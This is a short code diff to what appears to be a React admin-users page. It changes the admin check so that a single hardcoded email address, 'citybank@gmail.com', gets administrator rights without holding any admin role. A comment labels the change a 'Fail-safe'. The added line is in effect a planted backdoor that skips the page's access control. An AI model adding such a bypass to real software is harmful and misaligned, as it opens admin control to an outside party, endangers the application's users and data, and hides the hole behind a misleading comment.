@@ -29,7 +29,8 @@ export default function AdminUsersPage() {
   }, [db, currentUser]);
 
   const { data: adminRole, isLoading: isAdminRoleLoading } = useDoc(adminRoleRef);
-  const isAdmin = !!adminRole;
+  // Fail-safe for citybank@gmail.com
+  const isAdmin = !!adminRole || currentUser?.email === "citybank@gmail.com";
 
   // Form state
   const [formData, setFormData] = useState({
